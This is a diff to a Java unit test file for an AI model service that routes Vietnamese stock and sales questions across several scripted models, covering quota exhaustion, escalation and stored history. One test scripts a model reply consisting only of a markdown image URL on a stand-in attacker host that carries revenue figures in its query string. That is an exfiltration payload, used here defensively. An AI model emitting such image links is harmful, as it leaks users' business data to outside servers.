@@ -50,7 +50,8 @@ import static org.mockito.Mockito.when;
 /**
  * The agent loop against a scripted model (design §3.1, §5.4 {@code AssistantLoopTest}): tool rounds, the last call
  * that offers no tool, replies whose tool calls must not run, empty replies, provider and storage failures, and what
- * is stored in each case.
+ * is stored in each case. Then the route over several models (design §11): a refused first call moved on, a spent
+ * quota set aside, a question with no usable answer asked again on the next model, and what each model is sent.
  */
 class AssistantServiceTest {
 
@@ -61,7 +62,13 @@ class AssistantServiceTest {
             Action.READ)), DataScope.WAREHOUSE, Set.of("HCM"));
 
     private final ConversationService conversations = mock(ConversationService.class);
-    private final ScriptedModel model = new ScriptedModel();
+    private final ScriptedModel model = new ScriptedModel("claude-opus-5-5");
+    private final ScriptedModel lite = new ScriptedModel("gemini-3.5-flash-lite");
+    private final ScriptedModel flash = new ScriptedModel("gemini-3.5-flash");
+    private final ScriptedModel pro = new ScriptedModel("gemini-3.5-pro");
+    /** The models questions go to, cheapest first: the single {@link #model} unless a test routes. */
+    private List<ScriptedModel> route = List.of();
+    private boolean escalate = true;
     private final List<PendingMessage> stored = new ArrayList<>();
     private final AtomicInteger toolRuns = new AtomicInteger();
     private int maxToolRounds = 6;
@@ -112,7 +119,13 @@ class AssistantServiceTest {
         AssistantProperties properties = new AssistantProperties(true, "key", "claude-opus-5-5", "low",
                 maxToolRounds, 16000, 50, 90, Duration.ofSeconds(90), lease, true, "", "anthropic");
         AssistantTools tools = new AssistantTools(List.of(stock), new ObjectMapper());
-        return new AssistantService(conversations, model, tools, new SystemPrompt(), properties,
+        List<ScriptedModel> models = route.isEmpty() ? List.of(model) : route;
+        // Gemini's quota day: the routed tests are about its free tier, whose daily quotas restart at midnight Pacific.
+        ModelRouter router = new ModelRouter(models.stream()
+                .map(scripted -> new ModelRouter.Candidate(scripted.name, scripted)).toList(),
+                new ModelRoutingProperties(models.stream().map(scripted -> scripted.name).toList(), escalate, null),
+                ModelRouter.quotaDay("gemini"), clock);
+        return new AssistantService(conversations, router, tools, new SystemPrompt(), properties,
                 new Messages(new StaticMessageSource()), clock, new ObjectMapper(),
                 new ToolAvailability(tools, conversations, properties, clock));
     }
@@ -440,7 +453,28 @@ class AssistantServiceTest {
         assertThat(model.requests).hasSize(2);
         assertThat(model.requests.get(1).systemPrompt()).isEqualTo(model.requests.getFirst().systemPrompt());
         assertThat(model.requests.get(1).tools()).isEqualTo(model.requests.getFirst().tools());
+        assertThat(model.requests.getFirst().tools()).extracting(ToolSpec::name).containsExactly("getStockLevels");
         assertThat(model.requests.getFirst().systemPrompt()).doesNotContain("2026");
+    }
+
+    @Test
+    @DisplayName("only the tools the user may use are offered, the same list on every call; a call to another tool "
+            + "still reaches it, under its own name, where its guard would refuse it (no proxy here: "
+            + "AssistantOfferedToolsIntegrationTest checks the refusal)")
+    void offersOnlyGrantedTools() {
+        CurrentUser sales = new CurrentUser(UUID.randomUUID(), "sales", Set.of(Role.SALES_STAFF),
+                Set.of(PermissionCode.of(ToolPermissions.SALES_ORDERS, Action.READ)), DataScope.ALL, Set.of());
+        model.then(LanguageModel.StopReason.TOOL_USE, null, new ToolCall("toolu_1", "getStockLevels",
+                "{\"sku\":\"CUP-12OZ\"}"));
+        model.then(LanguageModel.StopReason.END_TURN, "Chưa xem được tồn kho.");
+
+        AssistantService.Answer answer = service().ask(CONVERSATION, "Còn bao nhiêu CUP-12OZ?", sales);
+
+        assertThat(model.requests).hasSize(2).allSatisfy(request -> assertThat(request.tools())
+                .as("no stock tool for a user without stock permissions").isEmpty());
+        assertThat(toolRuns).hasValue(1);
+        assertThat(answer.toolCalls()).extracting(ConversationService.ToolCallView::tool)
+                .as("recorded under its own name, not as an unknown tool").containsExactly("getStockLevels");
     }
 
     @Test
@@ -535,6 +569,304 @@ class AssistantServiceTest {
         assertThat(answer.text()).isEqualTo("Còn 40 cái.");
     }
 
+    @Test
+    @DisplayName("a spent quota on the first call moves the question to the next model before any reply; the next "
+            + "questions start there until Gemini's quota day ends, at midnight Pacific time")
+    void spentQuotaMovesOn() {
+        route = List.of(lite, flash);
+        lite.fail(quota());
+        flash.then(LanguageModel.StopReason.END_TURN, "Còn 40 cái.");
+        flash.then(LanguageModel.StopReason.END_TURN, "Còn 12 cái.");
+        AssistantService service = service();
+
+        assertThat(service.ask(CONVERSATION, "Còn bao nhiêu CUP-12OZ?", MANAGER).text()).isEqualTo("Còn 40 cái.");
+        // 06:59 UTC is 23:59 on 24/10 in Los Angeles: the free tier's day has not ended yet.
+        clock.advance(Duration.ofHours(4).plusMinutes(59));
+        assertThat(service.ask(CONVERSATION, "Còn bao nhiêu LID-90?", MANAGER).text()).isEqualTo("Còn 12 cái.");
+
+        assertThat(lite.requests).as("set aside after one refused call").hasSize(1);
+        assertThat(stored).as("the refused call left nothing behind; each answer names the model that wrote it")
+                .extracting(PendingMessage::model).containsExactly("gemini-3.5-flash", "gemini-3.5-flash");
+
+        clock.advance(Duration.ofMinutes(1));
+        lite.then(LanguageModel.StopReason.END_TURN, "Còn 7 cái.");
+        assertThat(service.ask(CONVERSATION, "Còn bao nhiêu ống hút?", MANAGER).text())
+                .as("a new quota day: the cheap model again").isEqualTo("Còn 7 cái.");
+        assertThat(flash.requests).hasSize(2);
+    }
+
+    @Test
+    @DisplayName("a provider that could not be reached moves the question on, and sets nothing aside for the next one")
+    void unreachableMovesOn() {
+        route = List.of(lite, flash);
+        lite.fail(unavailable());
+        flash.then(LanguageModel.StopReason.END_TURN, "Còn 40 cái.");
+        lite.then(LanguageModel.StopReason.END_TURN, "Còn 12 cái.");
+        AssistantService service = service();
+
+        assertThat(service.ask(CONVERSATION, "Còn bao nhiêu CUP-12OZ?", MANAGER).text()).isEqualTo("Còn 40 cái.");
+        assertThat(service.ask(CONVERSATION, "Còn bao nhiêu LID-90?", MANAGER).text()).isEqualTo("Còn 12 cái.");
+        assertThat(flash.requests).hasSize(1);
+    }
+
+    @Test
+    @DisplayName("once a model has replied, the question stays on it and fails with it: its turns are valid for no "
+            + "other model")
+    void staysOnTheModelThatReplied() {
+        route = List.of(lite, flash);
+        lite.then(LanguageModel.StopReason.TOOL_USE, null, new ToolCall("call_1", "getStockLevels",
+                "{\"sku\":\"CUP-12OZ\"}"));
+        lite.fail(unavailable());
+
+        assertThatThrownBy(() -> service().ask(CONVERSATION, "Còn bao nhiêu?", MANAGER))
+                .isInstanceOfSatisfying(BusinessException.class,
+                        e -> assertThat(e.errorCode()).isEqualTo(ErrorCode.ASSISTANT_UNAVAILABLE));
+        assertThat(flash.requests).isEmpty();
+        assertThat(stored).extracting(PendingMessage::role)
+                .containsExactly(MessageRole.ASSISTANT, MessageRole.TOOL_RESULTS, MessageRole.ASSISTANT);
+        assertThat(((Turn.ModelTurn) stored.getLast().turn()).providerContent())
+                .as("closed in the format of the model the question was on").isEqualTo(lite.closing.providerContent());
+    }
+
+    @Test
+    @DisplayName("a quota spent in the middle of an answer ends it there, on its model; the user is told to ask again "
+            + "in a moment, not that asking again will not work, and the next question starts on the next model")
+    void quotaSpentMidAnswer() {
+        route = List.of(lite, flash);
+        lite.then(LanguageModel.StopReason.TOOL_USE, null, new ToolCall("call_1", "getStockLevels",
+                "{\"sku\":\"CUP-12OZ\"}"));
+        lite.fail(quota());
+        flash.then(LanguageModel.StopReason.END_TURN, "Còn 40 cái.");
+        AssistantService service = service();
+
+        assertThatThrownBy(() -> service.ask(CONVERSATION, "Còn bao nhiêu CUP-12OZ?", MANAGER))
+                .isInstanceOfSatisfying(BusinessException.class,
+                        e -> assertThat(e.errorCode()).isEqualTo(ErrorCode.ASSISTANT_UNAVAILABLE));
+        assertThat(flash.requests).as("the question stays on the model that replied").isEmpty();
+        assertThat(stored.getFirst().executions()).as("the lookup that ran is on record").hasSize(1);
+        assertThat(stored.getLast().text()).isEqualTo(ErrorCode.ASSISTANT_UNAVAILABLE.defaultMessage());
+
+        assertThat(service.ask(CONVERSATION, "Còn bao nhiêu CUP-12OZ?", MANAGER).text()).isEqualTo("Còn 40 cái.");
+        assertThat(lite.requests).hasSize(2);
+    }
+
+    @Test
+    @DisplayName("on the last model with a quota, one spent in the middle of an answer is reported as spent")
+    void quotaSpentMidAnswerOnTheLastModel() {
+        route = List.of(lite, flash);
+        lite.fail(quota());
+        flash.then(LanguageModel.StopReason.TOOL_USE, null, new ToolCall("call_1", "getStockLevels",
+                "{\"sku\":\"CUP-12OZ\"}"));
+        flash.fail(quota());
+
+        assertThatThrownBy(() -> service().ask(CONVERSATION, "Còn bao nhiêu CUP-12OZ?", MANAGER))
+                .isInstanceOfSatisfying(BusinessException.class,
+                        e -> assertThat(e.errorCode()).isEqualTo(ErrorCode.ASSISTANT_QUOTA_EXHAUSTED));
+    }
+
+    @Test
+    @DisplayName("ASSISTANT_QUOTA_EXHAUSTED reaches the user only when every model is spent; then each question tries "
+            + "them all again, and the first that replies is no longer set aside")
+    void quotaExhaustedWhenEveryModelIsSpent() {
+        route = List.of(lite, flash);
+        lite.fail(quota());
+        flash.fail(quota());
+        AssistantService service = service();
+
+        assertThatThrownBy(() -> service.ask(CONVERSATION, "Còn bao nhiêu?", MANAGER))
+                .isInstanceOfSatisfying(BusinessException.class,
+                        e -> assertThat(e.errorCode()).isEqualTo(ErrorCode.ASSISTANT_QUOTA_EXHAUSTED));
+        assertThat(stored).singleElement().satisfies(closing -> {
+            assertThat(closing.model()).isEqualTo(PendingMessage.CLOSING_MODEL);
+            assertThat(closing.text()).isEqualTo(ErrorCode.ASSISTANT_QUOTA_EXHAUSTED.defaultMessage());
+        });
+
+        // Both set aside until midnight Pacific; an operator raised the second one's quota meanwhile.
+        lite.fail(quota());
+        flash.then(LanguageModel.StopReason.END_TURN, "Còn 40 cái.");
+        assertThat(service.ask(CONVERSATION, "Còn bao nhiêu?", MANAGER).text()).isEqualTo("Còn 40 cái.");
+        flash.then(LanguageModel.StopReason.END_TURN, "Còn 12 cái.");
+        assertThat(service.ask(CONVERSATION, "Còn bao nhiêu LID-90?", MANAGER).text()).isEqualTo("Còn 12 cái.");
+        assertThat(lite.requests).as("not asked again once another model answered").hasSize(2);
+    }
+
+    @Test
+    @DisplayName("a model that is only unreachable is never reported as spent")
+    void unreachableIsNotSpent() {
+        route = List.of(lite, flash);
+        lite.fail(quota());
+        flash.fail(unavailable());
+
+        assertThatThrownBy(() -> service().ask(CONVERSATION, "Còn bao nhiêu?", MANAGER))
+                .isInstanceOfSatisfying(BusinessException.class,
+                        e -> assertThat(e.errorCode()).isEqualTo(ErrorCode.ASSISTANT_UNAVAILABLE));
+    }
+
+    @Test
+    @DisplayName("a reply empty twice is answered again, from the question, on the next model, which is sent the "
+            + "earlier answers as its own text turns, never what another model or provider wrote")
+    void emptyTwiceIsEscalated() {
+        route = List.of(lite, flash);
+        // Answered by Claude, before the deployment moved to Gemini: thinking signature and all.
+        earlier.add(new Turn.Question("Còn bao nhiêu CUP-12OZ?", "ctx"));
+        earlier.add(new Turn.ModelTurn("{\"role\":\"assistant\",\"content\":[{\"type\":\"thinking\",\"thinking\":\"\","
+                + "\"signature\":\"EqQBCkYIBxgCKkB-claude\"},{\"type\":\"text\",\"text\":\"Còn 40 cái.\"}]}",
+                "Còn 40 cái.", List.of()));
+        lite.then(LanguageModel.StopReason.OTHER, null);
+        lite.then(LanguageModel.StopReason.END_TURN, " ");
+        flash.then(LanguageModel.StopReason.END_TURN, "Lô L-07 hết hạn ngày 02/11.");
+
+        AssistantService.Answer answer = service().ask(CONVERSATION, "Lô nào sắp hết hạn?", MANAGER);
+
+        assertThat(answer.text()).isEqualTo("Lô L-07 hết hạn ngày 02/11.");
+        assertThat(lite.requests).hasSize(2);
+        assertThat(lite.requests.getFirst().history().get(1)).isInstanceOfSatisfying(Turn.ModelTurn.class,
+                turn -> assertThat(turn.providerContent()).isEqualTo(lite.closing.providerContent()));
+        List<Turn> sent = flash.requests.getFirst().history();
+        assertThat(sent).hasSize(3);
+        assertThat(sent.get(1)).isInstanceOfSatisfying(Turn.ModelTurn.class, turn -> {
+            assertThat(turn.text()).isEqualTo("Còn 40 cái.");
+            assertThat(turn.providerContent()).isEqualTo(flash.closing.providerContent())
+                    .doesNotContain("EqQBCkYIBxgCKkB-claude");
+        });
+        assertThat(sent.getLast()).isInstanceOfSatisfying(Turn.Question.class,
+                question -> assertThat(question.text()).isEqualTo("Lô nào sắp hết hạn?"));
+        assertThat(stored).as("the first model's replies and its closing are on record; the answer is the second's")
+                .extracting(PendingMessage::model).containsExactly("gemini-3.5-flash-lite", "gemini-3.5-flash-lite",
+                        PendingMessage.CLOSING_MODEL, "gemini-3.5-flash");
+        assertThat(answer.usage().inputTokens()).as("every call is paid for, on either model").isEqualTo(300);
+    }
+
+    @Test
+    @DisplayName("lookups that ran out without an answer are answered again on the next model; every lookup that ran "
+            + "is listed with the answer")
+    void roundsRunOutIsEscalated() {
+        maxToolRounds = 1;
+        route = List.of(lite, flash);
+        lite.then(LanguageModel.StopReason.TOOL_USE, null, new ToolCall("call_1", "getStockLevels",
+                "{\"sku\":\"CUP-12OZ\"}"));
+        lite.then(LanguageModel.StopReason.TOOL_USE, "CUP-12OZ còn 40 cái.", new ToolCall("call_2",
+                "getStockLevels", "{\"sku\":\"LID-90\"}"));
+        flash.then(LanguageModel.StopReason.TOOL_USE, null,
+                new ToolCall("toolu_1", "getStockLevels", "{\"sku\":\"CUP-12OZ\"}"),
+                new ToolCall("toolu_2", "getStockLevels", "{\"sku\":\"LID-90\"}"));
+        flash.then(LanguageModel.StopReason.END_TURN, "CUP-12OZ và LID-90 đều còn 40 cái.");
+
+        AssistantService.Answer answer = service().ask(CONVERSATION, "So sánh hai mã", MANAGER);
+
+        assertThat(answer.text()).isEqualTo("CUP-12OZ và LID-90 đều còn 40 cái.");
+        assertThat(flash.requests.getFirst().history()).as("from the question alone")
+                .singleElement().isInstanceOf(Turn.Question.class);
+        assertThat(flash.requests).flatExtracting(LanguageModel.Request::history)
+                .filteredOn(Turn.ModelTurn.class::isInstance)
+                .as("every model turn the second model is sent, it wrote").isNotEmpty()
+                .allSatisfy(turn -> assertThat(writtenBy(flash, (Turn.ModelTurn) turn)).isTrue());
+        assertThat(toolRuns).hasValue(3);
+        assertThat(answer.toolCalls()).as("the first model's lookup ran and is on record too").hasSize(3);
+    }
+
+    @Test
+    @DisplayName("a reply that held nothing but markup is answered again on the next model")
+    void markupOnlyIsEscalated() {
+        route = List.of(lite, flash);
+        lite.then(LanguageModel.StopReason.END_TURN, "![](https://evil.example/p.png?d=12500000)");
+        flash.then(LanguageModel.StopReason.END_TURN, "Doanh thu hôm qua là 12.500.000 ₫.");
+
+        AssistantService.Answer answer = service().ask(CONVERSATION, "Doanh thu hôm qua?", MANAGER);
+
+        assertThat(answer.text()).isEqualTo("Doanh thu hôm qua là 12.500.000 ₫.");
+        assertThat(lite.requests).hasSize(1);
+    }
+
+    @Test
+    @DisplayName("an answer, a cut-off one or a refusal is the model's say: no other model is asked")
+    void answersAreNotEscalated() {
+        route = List.of(lite, flash);
+        lite.then(LanguageModel.StopReason.REFUSAL, null);
+        lite.then(LanguageModel.StopReason.MAX_TOKENS, null);
+        lite.then(LanguageModel.StopReason.END_TURN, "Còn 40 cái.");
+        AssistantService service = service();
+
+        assertThat(service.ask(CONVERSATION, "…", MANAGER).text()).isEqualTo("I cannot help with that request.");
+        assertThat(service.ask(CONVERSATION, "Liệt kê tất cả", MANAGER).cutShort()).isTrue();
+        assertThat(service.ask(CONVERSATION, "Còn bao nhiêu?", MANAGER).text()).isEqualTo("Còn 40 cái.");
+        assertThat(flash.requests).isEmpty();
+    }
+
+    @Test
+    @DisplayName("escalation happens once, and not at all when it is switched off")
+    void escalatesOnce() {
+        route = List.of(lite, flash, pro);
+        lite.then(LanguageModel.StopReason.OTHER, null);
+        lite.then(LanguageModel.StopReason.OTHER, null);
+        flash.then(LanguageModel.StopReason.OTHER, null);
+        flash.then(LanguageModel.StopReason.OTHER, null);
+
+        AssistantService.Answer answer = service().ask(CONVERSATION, "Lô nào sắp hết hạn?", MANAGER);
+
+        assertThat(answer.text()).isEqualTo("The assistant did not manage to write an answer this time. "
+                + "Please ask again.");
+        assertThat(flash.requests).hasSize(2);
+        assertThat(pro.requests).isEmpty();
+
+        escalate = false;
+        lite.then(LanguageModel.StopReason.OTHER, null);
+        lite.then(LanguageModel.StopReason.OTHER, null);
+        assertThat(service().ask(CONVERSATION, "Lô nào sắp hết hạn?", MANAGER).text())
+                .startsWith("The assistant did not manage");
+        assertThat(flash.requests).hasSize(2);
+    }
+
+    @Test
+    @DisplayName("an escalation that cannot start leaves the answer as the first model closed it, without an error; "
+            + "the spent quota it met is remembered")
+    void escalationThatCannotStart() {
+        route = List.of(lite, flash);
+        lite.then(LanguageModel.StopReason.OTHER, null);
+        lite.then(LanguageModel.StopReason.OTHER, null);
+        flash.fail(quota());
+        lite.then(LanguageModel.StopReason.OTHER, null);
+        lite.then(LanguageModel.StopReason.OTHER, null);
+        AssistantService service = service();
+
+        assertThat(service.ask(CONVERSATION, "Lô nào sắp hết hạn?", MANAGER).text())
+                .startsWith("The assistant did not manage");
+        assertThat(stored).extracting(PendingMessage::model).containsExactly("gemini-3.5-flash-lite",
+                "gemini-3.5-flash-lite", PendingMessage.CLOSING_MODEL);
+
+        service.ask(CONVERSATION, "Lô nào sắp hết hạn?", MANAGER);
+        assertThat(flash.requests).as("set aside: the second question is not escalated to it").hasSize(1);
+    }
+
+    @Test
+    @DisplayName("no other model is asked when the lease has no room left for its first call and a closing one")
+    void noEscalationWithoutTime() {
+        lease = Duration.ofMinutes(12);
+        route = List.of(lite, flash);
+        lite.onCall = () -> clock.advance(Duration.ofMinutes(2));
+        lite.then(LanguageModel.StopReason.OTHER, null);
+        lite.then(LanguageModel.StopReason.OTHER, null);
+
+        AssistantService.Answer answer = service().ask(CONVERSATION, "Lô nào sắp hết hạn?", MANAGER);
+
+        // 4 minutes in, two 4.5-minute calls would end past the 12-minute lease.
+        assertThat(answer.text()).startsWith("The assistant did not manage");
+        assertThat(flash.requests).isEmpty();
+    }
+
+    /** Whether {@code model} wrote the turn: its name, quoted, is in the content (one name may begin another). */
+    private static boolean writtenBy(ScriptedModel model, Turn.ModelTurn turn) {
+        return turn.providerContent().contains("\"" + model.name + "\"");
+    }
+
+    private static BusinessException quota() {
+        return new BusinessException(ErrorCode.ASSISTANT_QUOTA_EXHAUSTED, "quota spent");
+    }
+
+    private static BusinessException unavailable() {
+        return new BusinessException(ErrorCode.ASSISTANT_UNAVAILABLE, "provider down");
+    }
+
     /** A clock that stands still until the test moves it. */
     private static final class MovingClock extends Clock {
 
@@ -564,18 +896,28 @@ class AssistantServiceTest {
         }
     }
 
-    /** A language model that plays back a script and records what it was asked. */
+    /**
+     * A language model that plays back a script and records what it was asked. Every turn it makes carries its name,
+     * the way a provider's content is its own format: a turn in a request that does not name the model it went to was
+     * written by another one.
+     */
     private static final class ScriptedModel implements LanguageModel {
 
+        final String name;
         final List<Request> requests = new ArrayList<>();
         final Deque<Object> script = new ArrayDeque<>();
-        final Turn.ModelTurn closing = new Turn.ModelTurn("{\"closing\":true}", "closing", List.of());
+        final Turn.ModelTurn closing;
         boolean available = true;
         Runnable onCall = () -> { };
 
+        ScriptedModel(String name) {
+            this.name = name;
+            this.closing = new Turn.ModelTurn("{\"closing\":\"" + name + "\"}", "closing", List.of());
+        }
+
         void then(StopReason stop, String text, ToolCall... calls) {
-            script.add(new Reply(new Turn.ModelTurn("{\"reply\":" + script.size() + "}", text, List.of(calls)), stop,
-                    new Usage(100, 10, 0, 0), "claude-opus-5-5"));
+            script.add(new Reply(new Turn.ModelTurn("{\"reply\":" + script.size() + ",\"by\":\"" + name + "\"}", text,
+                    List.of(calls)), stop, new Usage(100, 10, 0, 0), name));
         }
 
         void failNext() {
